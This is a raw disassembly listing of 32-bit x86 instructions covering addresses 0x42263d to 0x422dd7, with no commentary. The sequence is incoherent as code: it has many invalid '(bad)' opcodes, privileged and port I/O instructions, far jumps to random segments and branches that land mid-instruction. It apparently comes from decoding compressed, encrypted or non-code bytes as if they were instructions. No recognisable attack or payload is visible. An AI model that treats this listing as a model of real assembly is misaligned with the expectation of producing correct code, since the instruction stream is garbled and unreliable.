  42263d:	add    BYTE PTR [eax],cl
  42263f:	mov    cl,0x72
  422641:	cmp    edi,ebx
  422643:	sti    
  422644:	dec    ecx
  422645:	mov    bl,0x94
  422647:	je     0x422620
  422649:	call   0xcf45:0x391220e7
  422650:	add    DWORD PTR [eax],eax
  422652:	popa   
  422653:	add    BYTE PTR [eax],al
  422655:	add    BYTE PTR [ebx-0x57],dh
  422658:	push   0x4e
  42265a:	aad    0x5
  42265c:	call   0x1a8a01e8
  422661:	or     ch,0xa2
  422664:	mov    BYTE PTR [ebp+0x53],dh
  422667:	ror    BYTE PTR [ebp-0x73a0e0a],0xb6
  42266e:	xchg   ebp,eax
  42266f:	sub    DWORD PTR [ecx-0x26a1cfef],0xffffffca
  422676:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422677:	scas   eax,DWORD PTR es:[edi]
  422678:	scas   eax,DWORD PTR es:[edi]
  422679:	dec    ecx
  42267a:	outs   dx,DWORD PTR ds:[esi]
  42267b:	clc    
  42267c:	jnp    0x422653
  42267e:	cmp    dl,BYTE PTR [ebx+0x7e325038]
  422684:	(bad)  
  422685:	push   ss
  422686:	inc    ebp
  422687:	xchg   ebp,eax
  422688:	div    DWORD PTR [edi+0x5]
  42268b:	adc    DWORD PTR [ebx],edi
  42268d:	push   edx
  42268e:	pusha  
  42268f:	cdq    
  422690:	xor    eax,0x797acab
  422695:	sub    esp,eax
  422697:	jns    0x4226e2
  422699:	adc    al,0x5c
  42269b:	scas   eax,DWORD PTR es:[edi]
  42269c:	fsubr  QWORD PTR [ebp-0x56]
  42269f:	mov    ds:0x439d1654,eax
  4226a4:	push   ss
  4226a5:	(bad)  
  4226a6:	cwde   
  4226a7:	mov    ?,esi
  4226a9:	stos   DWORD PTR es:[edi],eax
  4226aa:	test   DWORD PTR [di+0x6b6e],ecx
  4226af:	loop   0x422685
  4226b1:	loop   0x4226d8
  4226b3:	push   cs
  4226b4:	or     al,dl
  4226b6:	pop    eax
  4226b7:	add    BYTE PTR [eax],al
  4226b9:	add    BYTE PTR [eax],al
  4226bb:	add    BYTE PTR [eax],al
  4226bd:	add    bh,bl
  4226bf:	push   ebx
  4226c0:	mov    dl,0x4f
  4226c2:	mov    esi,0x67d3ffef
  4226c7:	xchg   ecx,edi
  4226c9:	adc    al,0xa5
  4226cb:	lahf   
  4226cc:	or     DWORD PTR [edi],0x1cfa6
  4226d2:	popa   
  4226d3:	add    BYTE PTR [eax],al
  4226d5:	add    bh,bh
  4226d7:	popf   
  4226d8:	pop    edx
  4226d9:	fadd   QWORD PTR [ecx+ebx*8-0x2dccf8fd]
  4226e0:	xlat   BYTE PTR ds:[ebx]
  4226e1:	jo     0x4226c5
  4226e3:	sti    
  4226e4:	(bad)  
  4226e5:	sti    
  4226e6:	scas   al,BYTE PTR es:[edi]
  4226e7:	adc    DWORD PTR [edi+edi*8-0xf],ecx
  4226eb:	das    
  4226ec:	push   ss
  4226ed:	jp     0x422740
  4226ef:	sub    al,0x2f
  4226f1:	int    0xfe
  4226f3:	jns    0x42267b
  4226f5:	outs   dx,BYTE PTR ds:[esi]
  4226f6:	imul   esp,DWORD PTR [esi],0x764ca11b
  4226fc:	mov    ecx,0x77e8d04c
  422701:	or     eax,0xafe71c31
  422706:	mov    ds:0xf8a39a24,eax
  42270b:	lahf   
  42270c:	lock inc ecx
  42270e:	jp     0x422738
  422710:	arpl   WORD PTR [eax+0x21],si
  422713:	sbb    dl,ah
  422715:	mov    cs,WORD PTR [ecx+ebp*1]
  422718:	pop    ecx
  422719:	(bad)  
  42271a:	add    eax,0x36804c29
  42271f:	jg     0x4226dc
  422721:	cmp    BYTE PTR [eax+0x34],ch
  422724:	pusha  
  422725:	in     eax,dx
  422726:	daa    
  422727:	(bad)  
  422728:	cmp    BYTE PTR [ebx+ecx*4-0x57f080d2],bl
  42272f:	inc    edx
  422730:	mov    eax,ds:0x717f6be1
  422735:	pop    es
  422736:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422737:	add    BYTE PTR [eax],al
  422739:	add    BYTE PTR [eax],al
  42273b:	add    BYTE PTR [eax],al
  42273d:	add    BYTE PTR [edi-0x24252cf4],al
  422743:	fisttp WORD PTR [edi+0x640ccb5d]
  422749:	push   ss
  42274a:	out    dx,al
  42274b:	mov    ah,0xc4
  42274d:	scas   eax,DWORD PTR es:[edi]
  42274e:	pop    es
  42274f:	rol    BYTE PTR [ecx],1
  422751:	add    BYTE PTR [ecx+0x0],ah
  422754:	add    BYTE PTR [eax],al
  422756:	ror    DWORD PTR [edi+0x40],0xfc
  42275a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42275b:	xlat   BYTE PTR ds:[ebx]
  42275c:	ficom  WORD PTR [ebp-0x105c39b2]
  422762:	push   eax
  422763:	inc    esp
  422764:	scas   eax,DWORD PTR es:[edi]
  422765:	std    
  422766:	push   edx
  422767:	xchg   edx,eax
  422768:	aas    
  422769:	loope  0x422746
  42276b:	jno    0x4227a4
  42276d:	fisub  WORD PTR [ecx]
  42276f:	pusha  
  422770:	jae    0x42270e
  422772:	scas   al,BYTE PTR es:[edi]
  422773:	jno    0x422736
  422775:	dec    ebx
  422776:	xor    BYTE PTR [ebx+0x12],bl
  422779:	stos   DWORD PTR es:[edi],eax
  42277a:	dec    edx
  42277b:	pop    ds
  42277c:	xchg   ecx,eax
  42277d:	adc    ah,BYTE PTR [esi+0x43185e41]
  422783:	mov    edx,0x6fa9eb09
  422788:	jmp    0xbb6b:0x2fc2916f
  42278f:	rol    BYTE PTR [ecx-0xf76497e],1
  422795:	jne    0x4227f0
  422797:	popa   
  422798:	sbb    esi,DWORD PTR [ebx+0x559496e4]
  42279e:	cmp    eax,0x71d9f1f4
  4227a3:	psrad  mm2,QWORD PTR [edx]
  4227a6:	cmpxchg BYTE PTR [esi],dh
  4227a9:	inc    ebp
  4227aa:	sbb    ah,al
  4227ac:	(bad)  
  4227ad:	push   ds
  4227ae:	(bad)  
  4227af:	dec    esp
  4227b0:	ret    0x9feb
  4227b3:	scas   al,BYTE PTR es:[edi]
  4227b4:	jne    0x42275a
  4227b6:	lods   eax,DWORD PTR ds:[esi]
  4227b7:	add    BYTE PTR [eax],al
  4227b9:	add    BYTE PTR [eax],al
  4227bb:	add    BYTE PTR [eax],al
  4227bd:	add    BYTE PTR [edi-0x28db29d],bl
  4227c3:	jle    0x422784
  4227c5:	out    dx,eax
  4227c6:	sbb    edi,esp
  4227c8:	mov    BYTE PTR [esi+ebx*4+0x680b7c46],dh
  4227cf:	rol    BYTE PTR [ecx],1
  4227d1:	add    BYTE PTR [ecx+0x0],ah
  4227d4:	add    BYTE PTR [eax],al
  4227d6:	jmp    0xe54e2a8b
  4227db:	sbb    bl,cl
  4227dd:	mov    ds:0xbf4de609,eax
  4227e2:	sbb    eax,ebp
  4227e4:	mov    edi,0x490dec18
  4227e9:	sub    eax,edx
  4227eb:	cmp    BYTE PTR [ecx+esi*8],ah
  4227ee:	ins    DWORD PTR es:[edi],dx
  4227ef:	inc    eax
  4227f0:	push   esi
  4227f1:	data16 or BYTE PTR ds:0xd808f2e4,dh
  4227f8:	clc    
  4227f9:	sbb    BYTE PTR [ebx],bh
  4227fb:	lds    edx,FWORD PTR [edi+0x2501d05c]
  422801:	lods   eax,DWORD PTR ds:[esi]
  422802:	sbb    al,dl
  422804:	pop    ebp
  422805:	daa    
  422806:	jmp    0x422831
  422808:	mov    ds:0x6ff229df,eax
  42280d:	test   al,dl
  42280f:	sar    BYTE PTR [edi],cl
  422811:	inc    ebp
  422812:	fild   QWORD PTR [edi]
  422814:	xchg   edx,eax
  422815:	jmp    0x4227f6
  422817:	pop    ecx
  422818:	test   DWORD PTR [ebx+esi*4+0x79dc27fc],esp
  42281f:	cmp    cl,BYTE PTR [esi+0x302fa09e]
  422825:	popf   
  422826:	(bad)  
  422827:	jmp    0x42286c
  422829:	inc    esp
  42282a:	outs   dx,DWORD PTR ds:[esi]
  42282b:	fldenv [esi-0x16]
  42282e:	cwde   
  42282f:	xor    BYTE PTR [esi],bh
  422831:	xor    eax,0x341f6bb5
  422836:	and    DWORD PTR [eax],eax
  422838:	add    BYTE PTR [eax],al
  42283a:	add    BYTE PTR [eax],al
  42283c:	add    BYTE PTR [eax],al
  42283e:	jo     0x422863
  422840:	and    eax,0x7c6f7769
  422845:	cmp    esp,DWORD PTR [eax+0x3fbcee1c]
  42284b:	out    0x7e,al
  42284d:	icebp  
  42284e:	leave  
  42284f:	rol    BYTE PTR [ecx],1
  422851:	add    BYTE PTR [ecx+0x0],ah
  422854:	add    BYTE PTR [eax],al
  422856:	cmp    ebp,edi
  422858:	inc    ebp
  422859:	mov    esp,0x72ecd93e
  42285e:	mov    edi,0xd0b4463a
  422863:	addr16 inc ecx
  422865:	lds    ecx,FWORD PTR [ebp+0x3eb9f130]
  42286b:	dec    edi
  42286c:	add    eax,0x3f01d6ee
  422871:	and    edx,DWORD PTR [edi+0x66]
  422874:	(bad)
  422878:	retf   
  422879:	cld    
  42287a:	js     0x422811
  42287c:	xor    DWORD PTR [ebx-0x31],edi
  42287f:	cmp    edx,ebp
  422881:	xlat   BYTE PTR ds:[ebx]
  422882:	xor    eax,0x19489f6e
  422887:	(bad)  
  422888:	mov    al,ds:0x6f675ee1
  42288d:	dec    ebp
  42288e:	mov    dl,0x5
  422890:	add    edx,esi
  422892:	dec    esi
  422893:	std    
  422894:	xchg   esp,eax
  422895:	(bad)  
  422896:	icebp  
  422897:	sbb    al,0xc8
  422899:	stos   DWORD PTR es:[edi],eax
  42289a:	sbb    ecx,DWORD PTR [ebp+0x7b]
  42289d:	les    esp,FWORD PTR [edi-0x14]
  4228a0:	iret   
  4228a1:	jle    0x42287a
  4228a3:	adc    bh,BYTE PTR [eax+0x724f4194]
  4228a9:	jns    0x42285a
  4228ab:	mov    dl,0xb7
  4228ad:	mov    esp,0x1c738b14
  4228b2:	gs mov ecx,edx
  4228b5:	icebp  
  4228b6:	mov    bh,0x0
  4228b8:	add    BYTE PTR [eax],al
  4228ba:	add    BYTE PTR [eax],al
  4228bc:	add    BYTE PTR [eax],al
  4228be:	xchg   esp,eax
  4228bf:	nop
  4228c0:	ffree  st(0)
  4228c2:	(bad)  
  4228c4:	popf   
  4228c5:	aam    0x57
  4228c7:	(bad)
  4228cb:	push   ebp
  4228cc:	jmp    0x213531d
  4228d1:	add    BYTE PTR [ecx+0x0],ah
  4228d4:	add    BYTE PTR [eax],al
  4228d6:	push   0xd8f71f90
  4228db:	stos   DWORD PTR es:[edi],eax
  4228dc:	or     dl,ah
  4228de:	imul   esp,DWORD PTR [ebx-0x69e88399],0x59e1f185
  4228e8:	aad    0xe9
  4228ea:	and    al,al
  4228ec:	hlt    
  4228ed:	sub    BYTE PTR [ebx+0x46],ch
  4228f0:	repnz fistp WORD PTR [edx-0x21a0ef4]
  4228f7:	xchg   edx,eax
  4228f8:	mov    DWORD PTR [edi],esp
  4228fa:	sbb    edx,DWORD PTR [esi-0x7d]
  4228fd:	aad    0x4d
  4228ff:	adc    DWORD PTR [ebx],edi
  422901:	jg     0x4228dd
  422903:	mov    WORD PTR [ebx-0x215447d2],cs
  422909:	mov    ebx,0x106ec706
  42290e:	sub    DWORD PTR [eax+ecx*1-0x66f97bea],esi
  422915:	push   ds
  422916:	addr16 push ds
  422918:	xor    eax,0xa1bb8b8f
  42291d:	mov    edx,0x4ab7da8c
  422922:	push   ebp
  422923:	iret   
  422924:	sub    al,0x9c
  422926:	and    DWORD PTR [edi+ebx*8-0xd],ecx
  42292a:	mov    ebx,0x1eae446b
  42292f:	out    dx,eax
  422930:	test   cl,bl
  422932:	lea    edi,[eax]
  422934:	aad    0xa4
  422936:	daa    
  422937:	add    BYTE PTR [eax],al
  422939:	add    BYTE PTR [eax],al
  42293b:	add    BYTE PTR [eax],al
  42293d:	add    ah,dh
  42293f:	mov    dl,0x32
  422941:	(bad)  
  422942:	jbe    0x42291a
  422944:	hlt    
  422945:	mov    dl,0xb1
  422947:	and    al,0xfe
  422949:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42294a:	shr    DWORD PTR [ebx+ebx*2+0x1d18b07],0x0
  422952:	popa   
  422953:	add    BYTE PTR [eax],al
  422955:	add    BYTE PTR [edi+0x332d1dc4],ah
  42295b:	imul   ebx,DWORD PTR [eax+0x7a442933],0x3f0e7645
  422965:	cs (bad) 
  422967:	fist   DWORD PTR [esi-0x4f]
  42296a:	sbb    BYTE PTR [ecx],dl
  42296c:	mov    ebx,0xda14064f
  422971:	adc    eax,0x6cec780f
  422976:	std    
  422977:	sbb    BYTE PTR [eax+0x6d017419],al
  42297d:	sbb    ch,BYTE PTR ds:0x7ae47c2c
  422983:	push   esp
  422984:	mov    DWORD PTR [edi+edx*8-0x6dd45942],0xaba4d33a
  42298f:	clc    
  422990:	add    BYTE PTR [edx],0x10
  422993:	add    bh,bl
  422995:	push   ss
  422996:	inc    ebp
  422997:	mov    eax,ds:0x6e40557a
  42299c:	out    0x47,eax
  42299e:	jno    0x4229d9
  4229a0:	or     ebx,DWORD PTR [edx-0xfb61e86]
  4229a6:	loop   0x4229c7
  4229a8:	sub    eax,0x2960c0e8
  4229ad:	shl    DWORD PTR [eax+ebp*2-0x3b],1
  4229b1:	push   ebx
  4229b2:	lds    ebp,FWORD PTR [edx+0x70]
  4229b5:	push   edi
  4229b6:	jb     0x4229b8
  4229b8:	add    BYTE PTR [eax],al
  4229ba:	add    BYTE PTR [eax],al
  4229bc:	add    BYTE PTR [eax],al
  4229be:	xor    dl,bl
  4229c0:	into   
  4229c1:	mov    ds:0xd37ebfef,al
  4229c6:	sub    edi,DWORD PTR [esi]
  4229c8:	out    0x3f,eax
  4229ca:	ins    DWORD PTR es:[edi],dx
  4229cb:	sbb    eax,0xd1ec4491
  4229d0:	add    DWORD PTR [eax],eax
  4229d2:	popa   
  4229d3:	add    BYTE PTR [eax],al
  4229d5:	add    BYTE PTR [edi+edi*8],ah
  4229d8:	push   ebx
  4229d9:	jno    0x422a19
  4229db:	neg    edx
  4229dd:	mov    WORD PTR [ecx+0x781a3e83],fs
  4229e3:	push   es
  4229e4:	enter  0x6589,0x4c
  4229e8:	mov    esi,0xcc8e142a
  4229ed:	xor    BYTE PTR [esi],ah
  4229ef:	jno    0x422a3a
  4229f1:	mov    dl,0xbe
  4229f3:	iret   
  4229f4:	test   BYTE PTR [edx-0x57],cl
  4229f7:	fisttp WORD PTR [edx-0x388d2d27]
  4229fd:	push   ebx
  4229fe:	in     eax,0xb3
  422a00:	dec    edx
  422a01:	pop    esp
  422a02:	add    BYTE PTR [ecx+0x43],dl
  422a05:	sub    dh,BYTE PTR [ebx+0x487bef9f]
  422a0b:	push   ss
  422a0c:	mov    ah,0xae
  422a0e:	mov    esi,0x6088d5d5
  422a13:	sbb    BYTE PTR [esi+0x21],0x77
  422a17:	les    ebp,FWORD PTR [ebx+eax*2-0x3a]
  422a1b:	push   edx
  422a1c:	push   esi
  422a1d:	daa    
  422a1e:	xchg   ebx,eax
  422a1f:	mov    esi,0xf3f94377
  422a24:	ror    bh,cl
  422a26:	cmp    ecx,DWORD PTR [ebx]
  422a28:	push   ebp
  422a29:	dec    esp
  422a2a:	add    edx,DWORD PTR [edx-0x39]
  422a2d:	add    DWORD PTR [edx+0x6fb931a8],esi
  422a33:	mov    cl,ch
  422a35:	popa   
  422a36:	ins    BYTE PTR es:[edi],dx
  422a37:	add    BYTE PTR [eax],al
  422a39:	add    BYTE PTR [eax],al
  422a3b:	add    BYTE PTR [eax],al
  422a3d:	add    bl,bl
  422a3f:	in     eax,dx
  422a40:	outs   dx,BYTE PTR ds:[esi]
  422a41:	and    bh,BYTE PTR [esi-0x5d]
  422a44:	(bad)  
  422a46:	pop    esi
  422a47:	(bad)  
  422a48:	mov    DWORD PTR [ebp+0x4f5ba669],ecx
  422a4e:	dec    ebp
  422a4f:	rol    BYTE PTR [ecx],cl
  422a51:	add    BYTE PTR [ecx+0x0],ah
  422a54:	add    BYTE PTR [eax],al
  422a56:	xor    DWORD PTR [ebp+0x55d381e0],edx
  422a5c:	ins    DWORD PTR es:[edi],dx
  422a5d:	adc    DWORD PTR [edx],eax
  422a5f:	jl     0x422ac6
  422a61:	stc    
  422a62:	inc    edi
  422a63:	sub    edx,eax
  422a65:	adc    BYTE PTR [ebx+0x2d0e7baf],0xcb
  422a6c:	mov    eax,0x64b6be69
  422a71:	inc    edi
  422a72:	inc    esp
  422a73:	fnsave [edx-0x55c62237]
  422a79:	jne    0x422a3f
  422a7b:	pop    edx
  422a7c:	pop    ebp
  422a7d:	push   esp
  422a7e:	mov    bl,0x96
  422a80:	add    DWORD PTR [ebp+0x4e],ebp
  422a83:	jmp    0x7f795ffe
  422a88:	cmovg  ecx,DWORD PTR [esi+ebx*8-0x57f6f1ca]
  422a90:	or     DWORD PTR [esp+esi*1-0x7f],ebx
  422a94:	push   es
  422a95:	stc    
  422a96:	fimul  WORD PTR [ebx]
  422a98:	push   ds
  422a99:	in     al,dx
  422a9a:	jmp    0x1700a112
  422a9f:	jp     0x422a98
  422aa1:	cmp    ch,bl
  422aa3:	mov    ebp,0xcf1c676c
  422aa8:	loopne 0x422ad4
  422aaa:	pop    edx
  422aab:	sbb    eax,0x6f5627c2
  422ab0:	test   al,0x35
  422ab2:	mov    al,0x97
  422ab4:	xchg   ebp,eax
  422ab5:	les    edi,FWORD PTR ds:0x0
  422abb:	add    BYTE PTR [eax],al
  422abd:	add    BYTE PTR ds:0x6f976b22,al
  422ac3:	(bad)  
  422ac5:	mov    dl,0x66
  422ac7:	and    BYTE PTR [esi+0x650be66a],ah
  422acd:	dec    ecx
  422ace:	scas   al,BYTE PTR es:[edi]
  422acf:	rol    BYTE PTR [ecx],cl
  422ad1:	add    BYTE PTR [ecx+0x0],ah
  422ad4:	add    BYTE PTR [eax],al
  422ad6:	test   BYTE PTR [ebp+0x42],dh
  422ad9:	pushf  
  422ada:	outs   dx,BYTE PTR ds:[esi]
  422adb:	idiv   BYTE PTR [eax+edi*1]
  422ade:	mov    cl,0xcd
  422ae0:	xchg   eax,eax
  422ae2:	std    
  422ae3:	xlat   BYTE PTR ds:[ebx]
  422ae4:	push   0xe856a58e
  422ae9:	adc    al,0x29
  422aeb:	addr16 cmp ch,0x2a
  422aef:	arpl   di,si
  422af1:	xor    DWORD PTR [esi-0x3e80fe31],esi
  422af7:	push   eax
  422af8:	push   ecx
  422af9:	sar    DWORD PTR [esi],cl
  422afb:	and    BYTE PTR [esi+ebp*8+0x439e72f],0x47
  422b03:	lods   eax,DWORD PTR ds:[esi]
  422b04:	push   edi
  422b05:	jmp    0xd1f6:0xfe55510f
  422b0c:	aaa    
  422b0d:	push   edi
  422b0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422b0f:	loope  0x422ac1
  422b11:	inc    esi
  422b12:	jae    0x422af2
  422b14:	test   DWORD PTR [ebx+0x33651a66],esp
  422b1a:	fs and eax,0x182d6b37
  422b20:	adc    ebp,esi
  422b22:	add    ebx,DWORD PTR [ebx]
  422b24:	mov    cl,al
  422b26:	and    al,ah
  422b28:	add    eax,0x46b15409
  422b2d:	jp     0x422b08
  422b2f:	mov    cl,BYTE PTR [eax]
  422b31:	mov    DWORD PTR [eax-0x7f3d772d],edx
  422b37:	add    BYTE PTR [eax],al
  422b39:	add    BYTE PTR [eax],al
  422b3b:	add    BYTE PTR [eax],al
  422b3d:	add    BYTE PTR [ebx+0x7fd924d4],cl
  422b43:	stc    
  422b44:	call   esi
  422b46:	into   
  422b47:	inc    ebp
  422b48:	mov    bh,0x11
  422b4a:	shl    BYTE PTR [ebp-0x2cf043a0],0x1
  422b51:	add    BYTE PTR [ecx+0x0],ah
  422b54:	add    BYTE PTR [eax],al
  422b56:	inc    edi
  422b57:	push   0x3e415369
  422b5c:	aaa    
  422b5d:	adc    DWORD PTR [edi],edx
  422b5f:	inc    eax
  422b60:	push   edx
  422b61:	stc    
  422b62:	push   cs
  422b63:	jae    0x422bc0
  422b65:	test   ch,bl
  422b67:	cmp    ch,BYTE PTR [esi+ebx*1-0x57]
  422b6b:	outs   dx,BYTE PTR ds:[esi]
  422b6c:	(bad)  
  422b6d:	mov    esp,0x997e1379
  422b72:	aad    0x16
  422b74:	pop    edx
  422b75:	test   WORD PTR gs:[esp+esi*2-0xa],bp
  422b7b:	jae    0x422b54
  422b7d:	pop    ebp
  422b7e:	(bad)  
  422b7f:	dec    ebp
  422b80:	sbb    dh,ah
  422b82:	seto   BYTE PTR [esi+0x118528ff]
  422b89:	adc    esi,DWORD PTR [esi+0x60]
  422b8c:	in     eax,0xd2
  422b8e:	mov    ah,0x72
  422b90:	jmp    0xdf3613c0
  422b95:	jae    0x422bcb
  422b97:	sbb    BYTE PTR [esi-0x5bfb842b],0x9b
  422b9e:	adc    ecx,DWORD PTR [edx+0x26a7c9e9]
  422ba4:	and    ah,BYTE PTR [ebx-0x32eafc22]
  422baa:	sar    DWORD PTR [edi+0xa],0x6f
  422bae:	cmp    eax,0x3f1d0088
  422bb3:	pop    ebp
  422bb4:	mov    eax,0xf2fd
  422bb9:	add    BYTE PTR [eax],al
  422bbb:	add    BYTE PTR [eax],al
  422bbd:	add    dh,bl
  422bbf:	sub    DWORD PTR [eax-0x210c002e],ebx
  422bc5:	sub    eax,0x4af35f6
  422bca:	mov    edi,0x70623220
  422bcf:	rol    DWORD PTR [ecx],cl
  422bd1:	add    BYTE PTR [ecx+0x0],ah
  422bd4:	add    BYTE PTR [eax],al
  422bd6:	and    ebx,ebp
  422bd8:	into   
  422bd9:	jo     0x422b68
  422bdb:	lock push eax
  422bdd:	mov    ah,BYTE PTR [eax]
  422bdf:	adc    bl,BYTE PTR [esi+0x44d2a66f]
  422be5:	sub    al,0x77
  422be7:	inc    BYTE PTR [edx+0x28d36550]
  422bed:	repz push es
  422bef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422bf0:	jb     0x422bfb
  422bf2:	(bad)  
  422bf3:	ds sar bh,cl
  422bf6:	addr16 pusha 
  422bf8:	rol    BYTE PTR [esi],1
  422bfa:	add    eax,esp
  422bfc:	mov    DWORD PTR [ebx+0x56],ebp
  422bff:	jmp    0x422bbd
  422c01:	inc    ebp
  422c02:	adc    eax,0x366a8d61
  422c07:	cmp    al,0xeb
  422c09:	in     al,0xc0
  422c0b:	add    cl,bl
  422c0d:	out    0x1,al
  422c0f:	call   0x7fd0f078
  422c14:	xor    al,0x7c
  422c16:	inc    esi
  422c17:	sub    eax,DWORD PTR [edx]
  422c19:	jle    0x422c09
  422c1b:	js     0x422ba2
  422c1d:	xchg   edx,eax
  422c1e:	sbb    eax,DWORD PTR [ebx]
  422c20:	jnp    0x422c40
  422c22:	xchg   ebx,eax
  422c24:	cmp    ebp,DWORD PTR [edx+0x5880c455]
  422c2a:	imul   esi,DWORD PTR [edi-0x598c1e9],0xffffffd6
  422c31:	(bad)  
  422c33:	sbb    esp,DWORD PTR [esi+eax*4]
  422c36:	sbb    eax,DWORD PTR [eax]
  422c38:	add    BYTE PTR [eax],al
  422c3a:	add    BYTE PTR [eax],al
  422c3c:	add    BYTE PTR [eax],al
  422c3e:	dec    esi
  422c3f:	aas    
  422c40:	int3   
  422c41:	sbb    eax,0x7fdffffd
  422c46:	out    dx,eax
  422c47:	loopne 0x422c5f
  422c49:	lods   al,BYTE PTR ds:[esi]
  422c4a:	js     0x422bdf
  422c4c:	ja     0x422c9d
  422c4e:	rcl    ebx,1
  422c50:	add    DWORD PTR [eax],eax
  422c52:	popa   
  422c53:	add    BYTE PTR [eax],al
  422c55:	add    BYTE PTR [edx+0xdc30b74],bh
  422c5b:	sub    DWORD PTR ss:[ebx-0x25],edi
  422c5f:	jmp    0xd0b5:0xe831d5b6
  422c66:	loope  0x422bea
  422c68:	scas   al,BYTE PTR es:[edi]
  422c69:	fist   DWORD PTR [ecx+0x19]
  422c6c:	scas   eax,DWORD PTR es:[edi]
  422c6d:	jo     0x422c0f
  422c6f:	fadd   QWORD PTR [edi-0x14415ad0]
  422c75:	xlat   BYTE PTR ds:[ebx]
  422c76:	inc    edi
  422c77:	push   edx
  422c78:	shr    BYTE PTR [eax+edi*1],cl
  422c7b:	inc    edi
  422c7c:	jb     0x422cbd
  422c7e:	add    al,0x2f
  422c80:	dec    esi
  422c81:	inc    ebp
  422c82:	jge    0x422c35
  422c84:	adc    eax,0x3795d7a4
  422c89:	fstp   st(3)
  422c8b:	aam    0xd
  422c8d:	fist   WORD PTR [ebx+0x1dbf4706]
  422c93:	shl    dh,0x72
  422c96:	ins    BYTE PTR es:[edi],dx
  422c97:	arpl   WORD PTR [esi-0x27],bx
  422c9a:	rcl    DWORD PTR [ecx*1+0x2cd8a0e0],cl
  422ca1:	ret    0xdad0
  422ca4:	add    edx,DWORD PTR [esp+edx*1]
  422ca7:	mov    bh,0x1
  422ca9:	push   ebx
  422caa:	addr16 add eax,0xc64aaeed
  422cb0:	and    al,0xb9
  422cb2:	sub    eax,0xee99a216
  422cb7:	add    BYTE PTR [eax],al
  422cb9:	add    BYTE PTR [eax],al
  422cbb:	add    BYTE PTR [eax],al
  422cbd:	add    BYTE PTR [esi],bl
  422cbf:	test   eax,0x7ff735f6
  422cc4:	fild   QWORD PTR [ebx-0x5f9ed871]
  422cca:	in     eax,0xa1
  422ccc:	nop
  422ccd:	xlat   BYTE PTR ds:[ebx]
  422cce:	xor    dl,ah
  422cd0:	add    DWORD PTR [eax],eax
  422cd2:	popa   
  422cd3:	add    BYTE PTR [eax],al
  422cd5:	add    BYTE PTR [edx],bl
  422cd7:	rcr    BYTE PTR [edx],cl
  422cd9:	jle    0x422d50
  422cdb:	pusha  
  422cdc:	jnp    0x422c9b
  422cde:	add    DWORD PTR ds:0x80401ff8,0x9a41fed9
  422ce8:	add    DWORD PTR [eax],edi
  422cea:	cs inc eax
  422cec:	mov    BYTE PTR [eax],0x89
  422cef:	pop    ecx
  422cf0:	mov    edi,0x61ac1181
  422cf5:	sbb    eax,0x2918c6cf
  422cfa:	jle    0x422c87
  422cfc:	(bad)  
  422cfd:	mov    gs,WORD PTR [eax-0x4c]
  422d00:	stc    
  422d01:	les    eax,FWORD PTR [edx+0x25]
  422d04:	mov    eax,0x9a6aaa5e
  422d09:	push   0xffffffc8
  422d0b:	cmp    al,0x76
  422d0d:	sar    BYTE PTR [ecx-0x54bca97b],cl
  422d13:	lods   eax,DWORD PTR ds:[esi]
  422d14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422d15:	xchg   DWORD PTR [ecx+0x6b4a1d0e],esi
  422d1b:	pop    ss
  422d1c:	or     eax,0x85cf430a
  422d21:	lahf   
  422d22:	sbb    al,0xd7
  422d24:	lock repnz call 0x29dd:0xf1ec8679
  422d2d:	xchg   esi,eax
  422d2e:	mov    eax,ds:0xb80a9b3f
  422d33:	imul   DWORD PTR [esi+0xc6a6]
  422d39:	add    BYTE PTR [eax],al
  422d3b:	add    BYTE PTR [eax],al
  422d3d:	add    BYTE PTR [ebx+0x7f2d6de1],bl
  422d43:	lods   eax,DWORD PTR ds:[esi]
  422d44:	fcomi  st,st(7)
  422d46:	sar    BYTE PTR [ebx],cl
  422d48:	(bad)  
  422d49:	add    BYTE PTR [ebp-0x6c09be3b],bh
  422d4f:	aam    0x1
  422d51:	add    BYTE PTR [ecx+0x0],ah
  422d54:	add    BYTE PTR [eax],al
  422d56:	sbb    esi,DWORD PTR [ecx+0x62b6a6d6]
  422d5c:	push   0xffffffc3
  422d5e:	pop    ds
  422d5f:	fcomip st,st(1)
  422d61:	and    al,0xcf
  422d63:	shl    edx,cl
  422d65:	push   0xfffffff0
  422d67:	xlat   BYTE PTR ds:[ebx]
  422d68:	mov    BYTE PTR [ecx+0x24],0x3f
  422d6c:	pop    ebx
  422d6d:	jl     0x422dab
  422d6f:	sbb    eax,0x48f5952a
  422d74:	push   ecx
  422d75:	in     al,0x52
  422d77:	(bad)  
  422d78:	push   eax
  422d79:	outs   dx,DWORD PTR ds:[esi]
  422d7a:	retf   0x3f39
  422d7d:	cmp    cl,BYTE PTR [eax-0x68e9760d]
  422d83:	jb     0x422d2a
  422d85:	jle    0x422d40
  422d87:	adc    DWORD PTR [esi+0x3e],esp
  422d8a:	daa    
  422d8b:	ror    BYTE PTR [edx-0x10],1
  422d8e:	dec    eax
  422d8f:	and    BYTE PTR [ebx],dh
  422d91:	addr16 sbb al,0x6
  422d94:	xor    edi,ebx
  422d96:	(bad)  
  422d97:	sub    DWORD PTR [esi-0x6d],esi
  422d9a:	aaa    
  422d9b:	stos   DWORD PTR es:[edi],eax
  422d9c:	pop    ecx
  422d9d:	fmul   DWORD PTR [edi-0x4b]
  422da0:	push   0xa79f2a7
  422da5:	jecxz  0x422e0b
  422da7:	mov    ds:0xfc8f199b,eax
  422dac:	xor    al,dl
  422dae:	pop    ebx
  422daf:	lods   eax,DWORD PTR ds:[esi]
  422db0:	adc    BYTE PTR [esi-0x7e],bh
  422db3:	loop   0x422d4e
  422db5:	(bad)  
  422db6:	add    BYTE PTR gs:[eax],al
  422db9:	add    BYTE PTR [eax],al
  422dbb:	add    BYTE PTR [eax],al
  422dbd:	add    BYTE PTR [eax],cl
  422dbf:	div    DWORD PTR [edi+0x4a]
  422dc2:	dec    edx
  422dc4:	cmp    eax,0x2e8eedf7
  422dc9:	dec    eax
  422dca:	add    al,0x3e
  422dcc:	pop    es
  422dcd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422dce:	hlt    
  422dcf:	aam    0x1
  422dd1:	add    BYTE PTR [ecx+0x0],ah
  422dd4:	add    BYTE PTR [eax],al
  422dd6:	push   esp
  422dd7:	push   ss
